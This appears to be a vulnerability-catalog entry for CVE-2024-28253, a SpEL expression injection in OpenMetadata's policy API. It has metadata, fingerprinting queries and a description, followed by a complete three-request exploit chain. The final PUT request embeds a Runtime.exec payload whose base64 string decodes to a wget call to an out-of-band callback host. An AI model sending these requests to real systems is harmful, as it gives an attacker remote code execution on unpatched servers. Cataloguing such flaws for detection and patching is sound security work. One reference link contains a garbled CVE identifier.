---
layout: post
cve_id: CVE-2024-28253
title: OpenMetaData - SpEL Injection in PUT /api/v1/policies
pcap: true
pcap_path: /pcaps/2024/CVE-2024-28253.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-28253.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: critical
impact: 'Attackers can execute arbitrary code remotely, potentially leading to full
  system compromise.

  '
remediation: 'Upgrade to version 1.3.1 or later.

  '
reference:
- https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/
- https://github.com/open-metadata/OpenMetadata/security/advisories/GHSA-7vf4-x5m2-r6gr
- https://nvd.nist.gov/vuln/detail/VE-2024-28253
- https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection
- https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java#L693
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
  cvss-score: 9.4
  cve-id: CVE-2024-28253
  cwe-id: CWE-94
  epss-score: 0.9256
  epss-percentile: 0.99726
  cpe: cpe:2.3:a:open-metadata:openmetadata:*:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: open-metadata
  product: openmetadata
  shodan-query: http.favicon.hash:"733091897"
  fofa-query: icon_hash="733091897"
  google-query: intitle:"openmetadata"
tags:
- cve
- cve2024
- openmetadata
- spel
- rce
- intrusive
- file-upload
- oast
- vkev
---

## üîç Vulnerability Description
OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. `CompiledRule::validateExpression` is also called from `PolicyRepository.prepare`. `prepare()` is called from `EntityRepository.prepareInternal()` which, in turn, gets called from `EntityResource.createOrUpdate()`. Note that even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and therefore after the SpEL expression has been evaluated. In order to reach this method, an attacker can send a PUT request to `/api/v1/policies` which gets handled by `PolicyResource.createOrUpdate()`. This vulnerability was discovered with the help of CodeQL's Expression language injection (Spring) query and is also tracked as `GHSL-2023-252`. This issue may lead to Remote Code Execution and has been addressed in version 1.3.1. Users are advised to upgrade. There are no known workarounds for this vulnerability.


## üåê HTTP Request
```nohighlight
POST /api/v1/users/signup HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15
Connection: close
Content-Length: 89
Content-Type: application/json
Accept-Encoding: gzip
{"firstName":"IHg1V","lastName":"EA9cE","email":"RSIHTK@ScWAh.com","password":"lGmcaQ2C"}
```

```nohighlight
POST /api/v1/users/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Connection: close
Content-Length: 54
Content-Type: application/json
Accept-Encoding: gzip
{"email":"RSIHTK@ScWAh.com","password":"bEdtY2FRMkM="}
```

```nohighlight
PUT /api/v1/policies HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 380
Authorization: Bearer iLziDz
Content-Type: application/json
Accept-Encoding: gzip
{"name":"38BKdhqQynK9EwGzY1iXB523ztR","rules":[{"name":"38BKdhqQynK9EwGzY1iXB523ztR","description":"38BKdhqQynK9EwGzY1iXB523ztR","effect":"deny","operations":["All"],"resources":["All"],"condition":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('d2dldCBodHRwOi8vZDVpcHVuMWxlMG80MHY3YTE5OWc0c2Y5cjF3OXN5Z256Lm9hc3QuZnVu')))"}]}
```

